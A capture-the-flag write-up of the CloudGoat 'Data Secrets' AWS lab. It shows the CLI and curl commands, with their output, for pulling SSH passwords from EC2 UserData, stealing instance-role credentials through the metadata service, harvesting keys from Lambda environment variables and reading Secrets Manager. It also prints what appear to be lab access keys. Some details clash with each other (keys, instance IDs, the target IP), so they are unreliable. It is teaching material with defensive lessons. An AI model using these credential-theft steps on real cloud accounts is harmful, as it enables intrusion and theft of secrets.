---
layout: default
title: "CloudGoat — Data Secrets AWS Walkthrough"
---

# 🚩 CloudGoat — Data Secrets
Welcome to my detailed walkthrough of the **Data Secrets** AWS pentesting scenario by Hack Smarter Red Team.  
This writeup covers **credential enumeration → EC2 access → lateral movement → privilege escalation → Secrets Manager**.  
The objective: start with basic IAM credentials and work your way into AWS Secrets Manager to retrieve the final flag.

---

## 🎯 Objective

> The client's primary concern is whether an attacker can gain access to their **AWS Secrets Manager**.  
> Starting with low-privilege IAM credentials, perform lateral movement and privilege escalation to retrieve the flag.

**Target:** `10.1.76.16`  
**Starting Credentials:**
```
start_user_access_key = AKIA2HVQ5NJFUI3N2UQV
start_user_secret_key = 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
```

---

## 🛠️ Step 1 — Configure & Confirm Starting Credentials

First, configure the AWS CLI profile with the provided starting credentials and verify identity:

```bash
aws configure --profile data
# AWS Access Key ID: AKIA2HVQ5NJFVWNN....
# AWS Secret Access Key: LjLG6WyesA2nYZQ4Q6I5MA5w/9paa9b4K2/H....
# Default region: us-east-1

aws sts get-caller-identity --profile data
```

**Output:**
```json
{
  "UserId": "AIDA2HVQ5NJFWDWR7PN3H",
  "Account": "703671921227",
  "Arn": "arn:aws:iam::703671921227:user/cg-start-user-cgidogtj5df20x"
}
```

We're authenticated as `cg-start-user`. Time to enumerate what this user can see.

---

## 🕵️ Step 2 — Enumerate the Environment

### EC2 Instances

```bash
aws ec2 describe-instances --profile data
```

This reveals **two running EC2 instances** in the account:

| Instance ID | Private IP | Public IP | IAM Profile |
|---|---|---|---|
| `i-0ab04892607e68a09` | `10.0.1.23` | `34.229.39.31` | `cg-ec2-instance-profile-cgid1cu9rl0f6y` |
| `i-0405a86bd1eb8a6f9` | `10.0.1.234` | `34.230.23.233` | `cg-ec2-instance-profile-cgidogtj5df20x` |

Scrolling through the output, one instance had a **suspicious public IP** — `98.91.201.20` — referenced later in a second scan. Flag that for later.

---

## 🔍 Step 3 — Extract Credentials from EC2 UserData

EC2 **UserData** is a script that runs at instance launch. Developers sometimes hardcode credentials here — a classic mistake. Let's check:

```bash
aws ec2 describe-instance-attribute \
  --instance-id i-0ab04892607e68a09 \
  --attribute userData \
  --profile data
```

**Output:**
```json
{
  "InstanceId": "i-0ab04892607e68a09",
  "UserData": {
    "Value": "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvd..."
  }
}
```

The value is Base64 encoded. Let's decode it:

```bash
echo 'IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQY...' | base64 -d
```

**Decoded:**
```bash
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart
```

💥 We just extracted SSH credentials from the instance launch script:

```
Username: ec2-user
Password: CloudGoatInstancePassword!
```

> 💡 **Lesson:** Never store credentials in EC2 UserData. It's visible to any IAM principal with `ec2:DescribeInstanceAttribute` on the instance.

---

## 🔑 Step 4 — SSH into the EC2 Instance

Using the extracted credentials, we SSH into the suspicious public IP identified earlier:

```bash
ssh ec2-user@98.91.201.20
# Password: CloudGoatInstancePassword!
```

**Output:**
```
Amazon Linux 2
[ec2-user@ip-10-0-1-209 ~]$
```

We're in. Now let's see what IAM role this instance has.

---

## ☁️ Step 5 — Steal EC2 Instance Role Credentials via IMDS

The **Instance Metadata Service (IMDS)** at `169.254.169.254` exposes temporary credentials for any IAM role attached to the EC2 instance. Without IMDSv2 enforced, unauthenticated calls work:

```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid42ghgr66ot
```

**Output:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA2HVQ5NJFQ7HHCPSH",
  "SecretAccessKey": "P1VGUS77qkIHQB90tI+ua+iQbgZL26DbHtC7V/Qx",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-03-21T07:13:56Z"
}
```

🎯 We now have **temporary AWS credentials** for the EC2 role. Configure them locally:

```bash
aws configure --profile role
# AccessKeyId: ASIA2HVQ5NJFQ7HHCPSH
# SecretAccessKey: P1VGUS77...
# Also set the session token in ~/.aws/credentials
```

Verify the new identity:

```bash
aws sts get-caller-identity --profile role
```

**Output:**
```json
{
  "Arn": "arn:aws:sts::703671921227:assumed-role/cg-ec2-role-cgid42ghgr66ot/i-0499bcfeb96d4af40"
}
```

We've pivoted to the **EC2 role**. Time to enumerate what it can access.

> 💡 **Lesson:** Always enforce **IMDSv2** (requiring a token header) to prevent SSRF and unauthorized metadata access.

---

## ⚡ Step 6 — Enumerate Lambda Functions (Lateral Movement)

With the EC2 role, we can list Lambda functions:

```bash
aws lambda list-functions --profile role --region us-east-1
```

Inspecting the environment variables of each Lambda function reveals **hardcoded DB user credentials**:

```json
"Environment": {
  "Variables": {
    "DB_USER_ACCESS_KEY": "AKIA2HVQ5NJFZNHXUN6W",
    "DB_USER_SECRET_KEY": "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"
  }
}
```

Three Lambda functions, each with their own `DB_USER` credentials exposed in plaintext.

> 💡 **Lesson:** Never store secrets in Lambda environment variables without encryption. Use **AWS Secrets Manager** or **SSM Parameter Store** with encryption instead — ironically, exactly what this lab is protecting.

---

## 🔧 Step 7 — Configure as Lambda User

Take the Lambda's exposed credentials and configure them as a new profile:

```bash
aws configure --profile user
# AccessKeyId: AKIA2HVQ5NJFZNHXUN6W
# SecretAccessKey: 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

aws sts get-caller-identity --profile user --region us-east-1
```

**Output:**
```json
{
  "UserId": "AIDA2HVQ5NJFXFOHWJWQW",
  "Account": "703671921227",
  "Arn": "arn:aws:iam::703671921227:user/cg-lambda-user-cgid1cu9rl0f6y"
}
```

We've laterally moved to a **lambda user** with potentially broader permissions.

---

## 🗝️ Step 8 — Access AWS Secrets Manager

Now the moment of truth — list available secrets:

```bash
aws secretsmanager list-secrets --profile user --region us-east-1
```

Three secrets are found, all named `cg-final-flag-*`. Let's retrieve the first one:

```bash
aws secretsmanager get-secret-value \
  --secret-id cg-final-flag-cgid1cu9rl0f6y \
  --region us-east-1 \
  --profile user
```

**Output:**
```json
{
  "Name": "cg-final-flag-cgid1cu9rl0f6y",
  "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}"
}
```

---

## 🏁 Flag

```
d4t4_s3cr3ts_4r3_fun
```

---

## 🗺️ Attack Chain Summary

```
Start User (IAM) 
    → EC2 describe-instances
        → UserData extraction (SSH creds)
            → SSH into EC2 instance
                → IMDS metadata theft (EC2 role creds)
                    → Lambda list-functions
                        → Hardcoded DB_USER creds in env vars
                            → Secrets Manager access
                                → 🏁 Flag
```

---

## 📝 Lessons Learned

- **EC2 UserData is not a safe place for credentials.** Any IAM user with `ec2:DescribeInstanceAttribute` can read it.
- **IMDSv2 should always be enforced.** Without it, any process on the instance can steal role credentials.
- **Lambda environment variables are not encrypted by default.** Use Secrets Manager or SSM for sensitive values.
- **Least privilege matters at every step.** The EC2 role shouldn't have had Lambda list access, and the lambda user shouldn't have had Secrets Manager access.
- **Secrets Manager is the right tool** — but only if you actually use it to store secrets, not hardcode them in the services that are supposed to retrieve them.

---

## 🎯 Final Thoughts

This was a fantastic AWS lateral movement chain that mirrors real-world cloud misconfigurations:

- Credential exposure via UserData → SSH access
- IMDS exploitation → Role credential theft
- Lambda env var exposure → Credential harvesting  
- Chained privileges → Secrets Manager access

Every step exploits a **real, common misconfiguration** seen in production AWS environments. This scenario is a perfect demonstration of why **defence in depth** matters — one misconfiguration at any layer would have broken the chain.

Happy hacking! ⚡
